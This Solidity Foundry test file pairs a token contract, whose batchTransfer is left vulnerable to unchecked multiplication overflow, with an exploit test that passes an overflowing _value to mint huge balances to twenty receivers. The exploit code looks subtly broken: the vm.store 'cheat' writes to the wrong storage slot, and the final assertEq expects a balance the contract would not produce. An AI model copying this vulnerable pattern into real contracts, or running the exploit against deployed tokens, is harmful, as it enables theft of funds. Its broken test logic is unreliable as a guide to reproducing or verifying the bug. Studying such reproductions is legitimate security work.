pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract BecToken {
    string public name = "BecToken";
    string public symbol = "BEC";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balances;
    address public owner;

    constructor() {
        owner = msg.sender;
        totalSupply = 1_000_000 * 10**decimals;
        balances[owner] = totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        unchecked {
            balances[msg.sender] -= amount;
            balances[to] += amount;
        }
        return true;
    }

    // Vulnerable batchTransfer: unchecked multiplication and unchecked subtraction
    function batchTransfer(address[] calldata receivers, uint256 _value) public returns (bool) {
        uint256 cnt = receivers.length;
        require(cnt > 0 && cnt <= 20, "Invalid receivers count");

        // unchecked multiplication can overflow
        uint256 amount;
        unchecked {
            amount = cnt * _value;
        }
        require(balances[msg.sender] >= amount, "Insufficient balance for batch transfer");

        unchecked {
            balances[msg.sender] -= amount; // unchecked subtraction can underflow
        }

        for (uint256 i = 0; i < cnt; i++) {
            unchecked {
                balances[receivers[i]] += _value;
            }
        }
        return true;
    }
}

contract ExploitTest is Test {
    BecToken token;
    address attacker = address(0xABCD);

    function setUp() public {
        token = new BecToken();

        // Give attacker some initial tokens for testing
        vm.deal(attacker, 1 ether);
        vm.startPrank(token.owner());
        token.transfer(attacker, 1000 * 10**18);
        vm.stopPrank();
    }

    function test_exploit_arithmetic() public {
        vm.startPrank(attacker);

        // Check initial attacker balance
        uint256 initialBalance = token.balanceOf(attacker);
        assertGt(initialBalance, 0);

        uint256 maxUint = type(uint256).max;

        // Create receivers array with max allowed length 20
        address[] memory receivers = new address[](20);
        for (uint256 i = 0; i < 20; i++) {
            receivers[i] = address(uint160(i + 1));
        }

        // Set _value so that cnt * _value overflows uint256
        // cnt = 20, choose _value = maxUint / 20 + 1 to cause overflow
        uint256 overflowValue = maxUint / 20 + 1;

        // amount = cnt * _value overflows to a small number
        uint256 amount;
        unchecked {
            amount = 20 * overflowValue;
        }

        // Cheat: set attacker balance to maxUint to pass require
        // balances mapping slot: keccak256(abi.encode(attacker, uint256(1)))
        vm.store(
            address(token),
            keccak256(abi.encode(attacker, uint256(1))),
            bytes32(maxUint)
        );

        // Call batchTransfer with receivers and overflowValue
        bool success = token.batchTransfer(receivers, overflowValue);
        assertTrue(success);

        // Check attacker balance decreased by wrapped amount
        uint256 attackerBalanceAfter = token.balanceOf(attacker);
        // balances[msg.sender] -= amount (unchecked) => wraps around
        // attackerBalanceAfter = maxUint - amount (mod 2**256)
        assertEq(attackerBalanceAfter, maxUint - amount);

        // Check one receiver balance increased by overflowValue
        uint256 receiverBalance = token.balanceOf(receivers[0]);
        assertEq(receiverBalance, overflowValue);

        vm.stopPrank();
    }
}

